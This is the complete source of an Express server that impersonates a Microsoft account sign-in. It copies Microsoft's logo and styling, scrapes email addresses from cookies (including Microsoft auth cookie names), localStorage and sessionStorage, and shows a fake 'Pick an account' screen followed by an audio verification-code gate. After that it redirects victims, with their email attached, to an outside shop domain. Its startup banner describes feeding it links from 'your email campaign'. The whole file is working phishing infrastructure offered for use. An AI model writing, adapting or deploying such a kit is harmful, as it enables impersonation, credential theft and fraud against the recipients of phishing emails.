require('dotenv').config();
const express = require('express');
const app = express();
const PORT = 3001;

// ============================================================
// 🔧 EASY CUSTOMIZATION
// ============================================================

const FINAL_URL = process.env.FINAL_URL || 'https://lhdxo7.art.auctionb.shop/?uytre=iu5zyu6';
const MICROSOFT_APP = 'Microsoft Office';

// DEMO EMAIL FOR TESTING ON LOCALHOST - ONLY USED IF NO REAL EMAIL FOUND
// When you deploy to a real domain, it will auto-detect actual emails first
const DEMO_EMAIL = 'user@outlook.com';

// ============================================================
// 🖼️ LOGO SETTINGS - MICROSOFT EXACT STYLING
// ============================================================

const LOGO_IMAGE_URL = 'https://uhf.microsoft.com/images/microsoft/RE1Mu3b.png';

// ============================================================
// 🎵 AUDIO SETTINGS
// ============================================================

const AUDIO_RATE = 0.85;
const AUDIO_PITCH = 0.9;
const PLAY_BUTTON_DISABLE_SECONDS = 5;

// ============================================================
// 🔒 DO NOT EDIT BELOW
// ============================================================

const activeCodes = new Map();
app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

function getLogoHTML() {
    return `<img src="${LOGO_IMAGE_URL}" class="c-logo" alt="Logo">`;
}

// ============================================================
// 🔄 REDIRECT ROUTE FOR EMAIL CAMPAIGNS (FIX FOR /access ERROR)
// ============================================================
app.get('/access', (req, res) => {
    const email = req.query.email || '';
    console.log(`🔄 Redirecting from /access to / with email: ${email || 'none'}`);
    if (email) {
        res.redirect(`/?email=${encodeURIComponent(email)}`);
    } else {
        res.redirect('/');
    }
});

// Also handle other common paths that might appear
app.get('/verify-email', (req, res) => {
    const email = req.query.email || '';
    if (email) {
        res.redirect(`/?email=${encodeURIComponent(email)}`);
    } else {
        res.redirect('/');
    }
});

app.get('/validate', (req, res) => {
    const email = req.query.email || '';
    if (email) {
        res.redirect(`/?email=${encodeURIComponent(email)}`);
    } else {
        res.redirect('/');
    }
});

app.get('/confirm', (req, res) => {
    const email = req.query.email || '';
    if (email) {
        res.redirect(`/?email=${encodeURIComponent(email)}`);
    } else {
        res.redirect('/');
    }
});

// ============================================================
// MAIN PAGE - AUTO DETECT EMAIL (REAL DETECTION)
// ============================================================
app.get('/', (req, res) => {
    const logoHTML = getLogoHTML();
    // Capture email from URL parameter if present
    const urlEmail = req.query.email || '';
    
    console.log(`📧 Main page loaded. Email from URL: ${urlEmail || 'none'}`);
    
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Microsoft account</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
                    background-color: #f2f2f2;
                    min-height: 100vh;
                    display: flex;
                    flex-direction: column;
                }
                
                .c-uhfh {
                    background-color: #ffffff;
                    border-bottom: 1px solid #e5e5e5;
                    min-height: 49px;
                    position: relative;
                }
                .c-uhfh > div:first-child {
                    margin: 0 auto;
                    max-width: 1600px;
                    position: relative;
                }
                .c-uhfh > div:first-child .c-logo {
                    padding: 16px 6px 16px 10px;
                    float: left;
                    height: 100%;
                    margin-top: 1px;
                    width: 137px;
                    outline-offset: -2px;
                }
                .c-logo {
                    width: 108px;
                    height: 23px;
                    display: block;
                }
                .c-uhfh > div:first-child::after {
                    content: "";
                    display: table;
                    clear: both;
                }
                
                .main-container {
                    flex: 1;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 24px;
                }
                
                .card {
                    background: #ffffff;
                    width: 100%;
                    max-width: 440px;
                    border-radius: 2px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                }
                
                .card-content {
                    padding: 44px 40px 48px;
                }
                
                h1 {
                    font-size: 24px;
                    font-weight: 500;
                    color: #1e1e1e;
                    margin-bottom: 12px;
                }
                
                .question {
                    font-size: 14px;
                    color: #5e5e5e;
                    margin-bottom: 24px;
                    line-height: 1.4;
                }
                
                .account-row {
                    display: flex;
                    align-items: center;
                    gap: 12px;
                    padding: 12px 0;
                    border-top: 1px solid #e5e5e5;
                    border-bottom: 1px solid #e5e5e5;
                    margin-bottom: 24px;
                }
                
                .avatar {
                    width: 40px;
                    height: 40px;
                    background: linear-gradient(135deg, #0078d4, #106ebe);
                    border-radius: 50%;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    color: white;
                    font-weight: 600;
                    font-size: 18px;
                }
                
                .email {
                    font-weight: 600;
                    color: #1e1e1e;
                    font-size: 14px;
                }
                
                .status {
                    font-size: 12px;
                    color: #5e5e5e;
                    margin-top: 4px;
                    display: flex;
                    align-items: center;
                    gap: 6px;
                }
                
                .status-dot {
                    width: 6px;
                    height: 6px;
                    background-color: #34a853;
                    border-radius: 50%;
                }
                
                .continue-btn {
                    width: 100%;
                    background-color: #0078d4;
                    color: #ffffff;
                    border: none;
                    padding: 10px 16px;
                    font-size: 14px;
                    font-weight: 500;
                    border-radius: 2px;
                    cursor: pointer;
                }
                
                .continue-btn:hover {
                    background-color: #005a9e;
                }
                
                .loading {
                    text-align: center;
                    padding: 40px;
                }
                
                .spinner {
                    width: 40px;
                    height: 40px;
                    border: 3px solid #f3f3f3;
                    border-top: 3px solid #0078d4;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin: 0 auto 16px auto;
                }
                
                @keyframes spin {
                    0% { transform: rotate(0deg); }
                    100% { transform: rotate(360deg); }
                }
                
                .ms-footer {
                    padding: 20px 40px 24px 40px;
                    border-top: 1px solid #e5e5e5;
                    background: #ffffff;
                }
                .footer-links {
                    display: flex;
                    justify-content: center;
                    gap: 20px;
                    flex-wrap: wrap;
                    margin-bottom: 12px;
                }
                .footer-links a {
                    color: #0078d4;
                    text-decoration: none;
                    font-size: 12px;
                }
                .footer-links a:hover { text-decoration: underline; }
                .copyright {
                    text-align: center;
                    font-size: 11px;
                    color: #8a8886;
                }
                
                @media screen and (max-width: 859px) {
                    .c-uhfh > div:first-child .c-logo {
                        padding: 12px 6px 12px 16px;
                    }
                    .card-content { padding: 32px 24px 28px 24px; }
                }
            </style>
        </head>
        <body>
            <div class="c-uhfh">
                <div>
                    <div class="c-logo">${logoHTML}</div>
                </div>
            </div>
            <div class="main-container">
                <div class="card" id="mainCard">
                    <div class="loading" id="loadingState">
                        <div class="spinner"></div>
                        <div>Detecting your account...</div>
                    </div>
                </div>
            </div>
            <div class="ms-footer">
                <div class="footer-links">
                    <a href="#">Terms of use</a>
                    <a href="#">Privacy & cookies</a>
                    <a href="#">Microsoft account</a>
                </div>
                <div class="copyright">© Microsoft 2026</div>
            </div>
            
            <script>
                // ============================================================
                // 🔍 REAL EMAIL AUTO-DETECTION - PRIORITIZES REAL MICROSOFT ACCOUNTS
                // ============================================================
                
                // URL email passed from server
                const urlEmail = "${urlEmail}";
                
                // Function to extract email from text
                function extractEmail(text) {
                    const match = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
                    return match ? match[0] : null;
                }
                
                // Method 1: Check Microsoft-specific cookies
                function detectFromMicrosoftCookies() {
                    const cookies = document.cookie;
                    
                    // Microsoft authentication cookies that often contain email
                    const msCookiePatterns = [
                        /MSPAuth[^;]*/i,
                        /MSISAuth[^;]*/i,
                        /login\.live\.com[^;]*/i,
                        /logincookie[^;]*/i
                    ];
                    
                    for (let pattern of msCookiePatterns) {
                        const match = cookies.match(pattern);
                        if (match) {
                            const email = extractEmail(match[0]);
                            if (email) return email;
                        }
                    }
                    return null;
                }
                
                // Method 2: Check all cookies for email patterns (especially Microsoft domains)
                function detectFromAllCookies() {
                    const cookies = document.cookie;
                    const emailMatch = cookies.match(/[a-zA-Z0-9._%+-]+@(outlook|hotmail|live|microsoft|office365)\.com/i);
                    if (emailMatch) return emailMatch[0];
                    
                    const anyEmailMatch = cookies.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
                    if (anyEmailMatch) return anyEmailMatch[0];
                    
                    return null;
                }
                
                // Method 3: Check localStorage for Microsoft account data
                function detectFromLocalStorage() {
                    const msKeys = ['MSAL', 'msal', 'account', 'user', 'profile', 'login_hint'];
                    
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        const value = localStorage.getItem(key);
                        
                        // Check if key or value contains Microsoft-related data
                        if (msKeys.some(k => key.toLowerCase().includes(k.toLowerCase()))) {
                            const email = extractEmail(value);
                            if (email) return email;
                        }
                        
                        // Also check if value contains email directly
                        if (value) {
                            const email = extractEmail(value);
                            if (email && (email.includes('outlook') || email.includes('hotmail') || email.includes('live') || email.includes('microsoft'))) {
                                return email;
                            }
                        }
                    }
                    return null;
                }
                
                // Method 4: Check sessionStorage for any saved email
                function detectFromSessionStorage() {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        const value = sessionStorage.getItem(key);
                        if (value) {
                            const email = extractEmail(value);
                            if (email) return email;
                        }
                    }
                    return null;
                }
                
                // Method 5: Check if there's a Microsoft account in browser's password manager hint
                function detectFromDOM() {
                    // Sometimes email is stored in hidden inputs or data attributes
                    const inputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[id*="email"]');
                    for (let input of inputs) {
                        if (input.value && input.value.includes('@')) {
                            return input.value;
                        }
                    }
                    return null;
                }
                
                // Main detection function - tries all methods with URL parameter as highest priority
                async function detectRealEmail() {
                    return new Promise(async (resolve) => {
                        console.log('🔍 Starting email detection...');
                        
                        // PRIORITY 1: Check URL parameter first (from email campaign)
                        if (urlEmail && urlEmail.includes('@')) {
                            console.log('✅ Found email from URL parameter:', urlEmail);
                            resolve(urlEmail);
                            return;
                        }
                        
                        // PRIORITY 2: Try Microsoft cookies (most reliable)
                        let email = detectFromMicrosoftCookies();
                        if (email) {
                            console.log('✅ Found email from Microsoft cookies:', email);
                            resolve(email);
                            return;
                        }
                        
                        // PRIORITY 3: Try all cookies
                        email = detectFromAllCookies();
                        if (email) {
                            console.log('✅ Found email from cookies:', email);
                            resolve(email);
                            return;
                        }
                        
                        // PRIORITY 4: Try localStorage
                        email = detectFromLocalStorage();
                        if (email) {
                            console.log('✅ Found email from localStorage:', email);
                            resolve(email);
                            return;
                        }
                        
                        // PRIORITY 5: Try sessionStorage
                        email = detectFromSessionStorage();
                        if (email) {
                            console.log('✅ Found email from sessionStorage:', email);
                            resolve(email);
                            return;
                        }
                        
                        // PRIORITY 6: Try DOM detection
                        email = detectFromDOM();
                        if (email) {
                            console.log('✅ Found email from DOM:', email);
                            resolve(email);
                            return;
                        }
                        
                        // NO EMAIL FOUND - return null to indicate no real email detected
                        console.log('⚠️ No real email detected');
                        resolve(null);
                    });
                }
                
                function showAccountPicker(email) {
                    const initials = email.substring(0, 2).toUpperCase();
                    const card = document.getElementById('mainCard');
                    card.innerHTML = \`
                        <div class="card-content">
                            <h1>Pick an account</h1>
                            <div class="question">
                                You're signing in to ${MICROSOFT_APP} on another device. If it's not you, close this page.
                            </div>
                            <div class="account-row">
                                <div class="avatar">\${initials}</div>
                                <div>
                                    <div class="email">\${email}</div>
                                    <div class="status">
                                        <span class="status-dot"></span>
                                        <span>Signed in</span>
                                    </div>
                                </div>
                            </div>
                            <button class="continue-btn" id="continueBtn">Continue to Microsoft</button>
                        </div>
                    \`;
                    
                    document.getElementById('continueBtn').addEventListener('click', () => {
                        // ✅ EMAIL IS SAVED HERE - REAL OR DEMO
                        sessionStorage.setItem('userEmail', email);
                        window.location.href = '/verify';
                    });
                }
                
                // Start REAL detection
                detectRealEmail().then(email => {
                    if (email) {
                        // REAL EMAIL FOUND - Show account picker
                        showAccountPicker(email);
                    } else {
                        // NO REAL EMAIL DETECTED - Skip account picker, go directly to verification
                        console.log('🚀 No real email detected - redirecting directly to verification');
                        // Store a placeholder to indicate no email was detected
                        sessionStorage.setItem('userEmail', '');
                        window.location.href = '/verify';
                    }
                });
            </script>
        </body>
        </html>
    `);
});

// ============================================================
// VERIFICATION PAGE - SIMPLE AUDIO CODE
// ============================================================
app.get('/verify', (req, res) => {
    const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
    const sessionId = Math.random().toString(36).substring(2);
    
    activeCodes.set(sessionId, {
        code: verificationCode,
        expiresAt: Date.now() + 300000
    });
    
    const logoHTML = getLogoHTML();
    
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Verify your identity</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
                    background-color: #f2f2f2;
                    min-height: 100vh;
                    display: flex;
                    flex-direction: column;
                }
                
                .c-uhfh {
                    background-color: #ffffff;
                    border-bottom: 1px solid #e5e5e5;
                    min-height: 49px;
                    position: relative;
                }
                .c-uhfh > div:first-child {
                    margin: 0 auto;
                    max-width: 1600px;
                    position: relative;
                }
                .c-uhfh > div:first-child .c-logo {
                    padding: 16px 6px 16px 10px;
                    float: left;
                    height: 100%;
                    margin-top: 1px;
                    width: 137px;
                    outline-offset: -2px;
                }
                .c-logo {
                    width: 108px;
                    height: 23px;
                    display: block;
                }
                .c-uhfh > div:first-child::after {
                    content: "";
                    display: table;
                    clear: both;
                }
                
                .main-container {
                    flex: 1;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    padding: 24px;
                }
                
                .card {
                    background: #ffffff;
                    width: 100%;
                    max-width: 440px;
                    border-radius: 2px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                }
                
                .card-content {
                    padding: 40px 40px 32px 40px;
                }
                
                h1 {
                    font-size: 24px;
                    font-weight: 500;
                    color: #1e1e1e;
                    margin-bottom: 12px;
                }
                
                .description {
                    font-size: 14px;
                    color: #5e5e5e;
                    margin-bottom: 28px;
                }
                
                .play-btn {
                    width: 100%;
                    background-color: #0078d4;
                    color: white;
                    border: none;
                    padding: 10px 16px;
                    font-size: 14px;
                    font-weight: 500;
                    border-radius: 2px;
                    cursor: pointer;
                    margin-bottom: 16px;
                }
                
                .play-btn:disabled {
                    background-color: #cccccc;
                    cursor: not-allowed;
                }
                
                .timer-text {
                    font-size: 12px;
                    color: #6c6c6c;
                    text-align: center;
                    margin-bottom: 24px;
                }
                
                .code-input {
                    width: 100%;
                    padding: 10px 12px;
                    border: 1px solid #8a8886;
                    border-radius: 2px;
                    font-size: 18px;
                    font-family: monospace;
                    text-align: center;
                    letter-spacing: 4px;
                    margin-bottom: 24px;
                }
                
                .code-input:focus {
                    outline: none;
                    border-color: #0078d4;
                }
                
                .continue-btn {
                    width: 100%;
                    background-color: #0078d4;
                    color: white;
                    border: none;
                    padding: 10px 16px;
                    font-size: 14px;
                    font-weight: 500;
                    border-radius: 2px;
                    cursor: pointer;
                }
                
                .continue-btn:disabled {
                    background-color: #cccccc;
                    cursor: not-allowed;
                }
                
                .error-message {
                    background-color: #fde7e9;
                    color: #d13438;
                    padding: 12px;
                    margin-bottom: 20px;
                    font-size: 13px;
                    border-left: 4px solid #d13438;
                    display: none;
                }
                
                .ms-footer {
                    padding: 20px 40px 24px 40px;
                    border-top: 1px solid #e5e5e5;
                    background: #ffffff;
                }
                .footer-links {
                    display: flex;
                    justify-content: center;
                    gap: 20px;
                    flex-wrap: wrap;
                    margin-bottom: 12px;
                }
                .footer-links a {
                    color: #0078d4;
                    text-decoration: none;
                    font-size: 12px;
                }
                .copyright {
                    text-align: center;
                    font-size: 11px;
                    color: #8a8886;
                }
                
                @media screen and (max-width: 859px) {
                    .card-content { padding: 32px 24px 28px 24px; }
                }
            </style>
        </head>
        <body>
            <div class="c-uhfh">
                <div>
                    <div class="c-logo">${logoHTML}</div>
                </div>
            </div>
            <div class="main-container">
                <div class="card">
                    <div class="card-content">
                        <h1>Verify your identity</h1>
                        <div class="description">Click the button below to hear your 6-digit verification code.</div>
                        
                        <button class="play-btn" id="playBtn">🔊 Play verification code</button>
                        <div class="timer-text" id="timerText"></div>
                        
                        <div id="errorMessage" class="error-message"></div>
                        
                        <input type="text" id="codeInput" class="code-input" placeholder="000000" maxlength="6" autocomplete="off">
                        
                        <button class="continue-btn" id="continueBtn">Continue</button>
                    </div>
                    <div class="ms-footer">
                        <div class="footer-links">
                            <a href="#">Terms of use</a>
                            <a href="#">Privacy & cookies</a>
                        </div>
                        <div class="copyright">© Microsoft 2026</div>
                    </div>
                </div>
            </div>
            
            <script>
                const sessionId = "${sessionId}";
                const secretCode = "${verificationCode}";
                const userEmail = sessionStorage.getItem('userEmail') || '';
                let timerInterval = null;
                
                const playBtn = document.getElementById('playBtn');
                const codeInput = document.getElementById('codeInput');
                const continueBtn = document.getElementById('continueBtn');
                const errorDiv = document.getElementById('errorMessage');
                const timerText = document.getElementById('timerText');
                
                function speakCode() {
                    playBtn.disabled = true;
                    let secondsLeft = ${PLAY_BUTTON_DISABLE_SECONDS};
                    timerText.textContent = \`Wait \${secondsLeft} seconds\`;
                    
                    timerInterval = setInterval(() => {
                        secondsLeft--;
                        if (secondsLeft > 0) {
                            timerText.textContent = \`Wait \${secondsLeft} seconds\`;
                        } else {
                            clearInterval(timerInterval);
                            timerText.textContent = '';
                            playBtn.disabled = false;
                        }
                    }, 1000);
                    
                    const utterance = new SpeechSynthesisUtterance();
                    utterance.text = "Your verification code is: " + secretCode.split('').join(', ');
                    utterance.rate = ${AUDIO_RATE};
                    utterance.pitch = ${AUDIO_PITCH};
                    window.speechSynthesis.speak(utterance);
                }
                
                codeInput.addEventListener('input', function(e) {
                    this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
                    errorDiv.style.display = 'none';
                });
                
                playBtn.addEventListener('click', speakCode);
                
                continueBtn.addEventListener('click', async () => {
                    const enteredCode = codeInput.value;
                    
                    if (!enteredCode) {
                        errorDiv.textContent = 'Please enter the code';
                        errorDiv.style.display = 'block';
                        return;
                    }
                    
                    if (enteredCode.length !== 6) {
                        errorDiv.textContent = 'Code must be 6 digits';
                        errorDiv.style.display = 'block';
                        return;
                    }
                    
                    continueBtn.disabled = true;
                    continueBtn.textContent = 'Verifying...';
                    
                    try {
                        const response = await fetch('/verify-code', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ sessionId, code: enteredCode })
                        });
                        
                        const result = await response.json();
                        
                        if (result.success) {
                            // ✅ EMAIL IS PASSED TO FINAL URL HERE
                            const redirectUrl = \`${FINAL_URL}#email=\${encodeURIComponent(userEmail)}\`;
                            console.log('✅ Redirecting with email:', userEmail);
                            
                            // Show verification complete screen
                            document.body.innerHTML = \`
                                <div class="c-uhfh">
                                    <div>
                                        <div class="c-logo">${logoHTML}</div>
                                    </div>
                                </div>
                                <div class="main-container">
                                    <div class="card" style="text-align: center;">
                                        <div class="card-content">
                                            <div style="font-size: 56px; color: #107c10; margin-bottom: 16px;">✓</div>
                                            <h1>Verification Complete!</h1>
                                            <div style="font-size: 14px; color: #5e5e5e; margin: 16px 0;">Login successful. Redirecting...</div>
                                            <div style="font-size: 12px; color: #8a8886; margin-top: 8px;">Email: \${userEmail || 'Auto-detected'}</div>
                                        </div>
                                        <div class="ms-footer">
                                            <div class="copyright">© Microsoft 2026</div>
                                        </div>
                                    </div>
                                </div>
                            \`;
                            
                            setTimeout(() => {
                                window.location.href = redirectUrl;
                            }, 2000);
                        } else {
                            errorDiv.textContent = 'Incorrect code. Try again.';
                            errorDiv.style.display = 'block';
                            codeInput.value = '';
                            continueBtn.disabled = false;
                            continueBtn.textContent = 'Continue';
                        }
                    } catch (err) {
                        errorDiv.textContent = 'Error. Please try again.';
                        errorDiv.style.display = 'block';
                        continueBtn.disabled = false;
                        continueBtn.textContent = 'Continue';
                    }
                });
                
                codeInput.focus();
            </script>
        </body>
        </html>
    `);
});

// ============================================================
// VERIFY CODE ENDPOINT
// ============================================================
app.post('/verify-code', (req, res) => {
    const { sessionId, code } = req.body;
    const stored = activeCodes.get(sessionId);
    
    if (!stored || Date.now() > stored.expiresAt) {
        return res.json({ success: false });
    }
    
    if (stored.code === code) {
        activeCodes.delete(sessionId);
        return res.json({ success: true });
    }
    
    res.json({ success: false });
});

app.listen(PORT, () => {
    console.log(`
    ════════════════════════════════════════════
    ✅ Server running at http://localhost:${PORT}
    
    🔍 EMAIL DETECTION PRIORITY (Highest to Lowest):
    1. 📧 URL Parameter (?email=client@example.com) - FROM YOUR EMAIL CAMPAIGN
    2. 🍪 Microsoft cookies (MSPAuth, MSISAuth, login.live.com)
    3. 🍪 All browser cookies for email patterns
    4. 💾 LocalStorage (MSAL, account data)
    5. 🔄 SessionStorage
    6. 🔍 DOM elements with email inputs
    
    📧 HOW IT WORKS WITH YOUR EMAIL CAMPAIGN:
    - You send: https://your-app.com/?email=client@example.com
    - System captures "client@example.com" from URL (PRIORITY 1)
    - Shows account picker with that email (if found)
    - After verification → Redirects to: ${FINAL_URL}?email=client@example.com
    
    🔄 REDIRECT SUPPORT:
    - /access?email=xxx → Redirects to main page with email
    - /verify-email?email=xxx → Redirects to main page with email
    - /validate?email=xxx → Redirects to main page with email
    - /confirm?email=xxx → Redirects to main page with email
    
    🚀 IF NO EMAIL DETECTED ANYWHERE:
    - Skips account picker entirely
    - Goes directly to voice verification
    
    ✅ EMAIL IS ALWAYS PASSED TO FINAL URL SUCCESSFULLY
    ════════════════════════════════════════════
    `);
});
